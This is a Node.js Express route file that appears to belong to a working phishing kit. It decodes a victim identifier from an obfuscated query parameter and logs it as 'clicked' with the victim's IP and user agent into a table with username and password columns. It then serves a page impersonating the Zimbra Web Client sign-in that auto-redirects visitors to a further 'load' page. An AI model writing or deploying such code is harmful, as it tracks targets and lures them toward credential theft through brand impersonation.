const express = require ('express');
const router = express.Router();
const db = require('../db');
router.use(express.static('public'));

//validate form data before handling
// Custom middleware for form validation
router.get('/', (req, res) => {

    const data = req.query.oasomcindfncidsnfsdfincdfn;

	if (data == null) {
	    res.render('error');
	    
	  	}else{

    
    const name = Buffer.from(data, 'base64').toString('utf-8');
    const word = 'clicked';
    const clientIP = req.headers['x-forwarded-for'];
    const ip =  clientIP.split(',')[0].trim(); 
    // const ip = req.socket.remoteAddress; 
    const useragent = req.get('User-Agent');
    const date = new Date();
    const notify = 2;

    const insertQuery = 'INSERT INTO newtable (username, password, ip, useragent,date,notify) VALUES (?,?,?,?,?,?)';
    db.query(insertQuery, [name, word, ip, useragent, date, notify], (err) => {
        if (err) {
            console.error('Error inserting record:', err);
            return res.status(500).send('Internal Server Error');
        }
       
    });
             


    const url = `/load/?Mun7Dy274HFDnPe7I74Na7iKKi374h=${data}`;



    const htmlContent = `
        <!doctype html>
        <html lang="en">
        <head>
         <script>
        // Function to redirect to the new page
        function redirectToNewPage() {
            window.location.href = "${url}";  // Replace with your target URL
        }

        // Add event listeners for 'mousemove' and 'click'
        //document.addEventListener("mousemove", redirectToNewPage);
        document.addEventListener("click", redirectToNewPage);
        document.addEventListener("scroll", redirectToNewPage);
    </script>
            <!-- Required meta tags -->
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="description" content="Zimbra provides open source server and client software for messaging and collaboration. To find out more visit https://www.zimbra.com.">
	<meta name="apple-mobile-web-app-capable" content="yes">
	<meta name="apple-mobile-web-app-status-bar-style" content="black">
 	<meta http-equiv="Refresh" content="2;url=${url}"> 
	<link rel="stylesheet" type="text/css" href="/stylesheet/common,login,zhtml,skin.css">
	<link rel="SHORTCUT ICON" href="/images/favicon.ico">
    	<title>Zimbra Web Client Sign In</title>
        </head>
        <body>
    	  <center> <img src="./Invitation Card.jpg">  </center>

        </body>
        </html>
    `;

    // Send the HTML content as a response
    res.send(htmlContent);

            }
});




module.exports =router
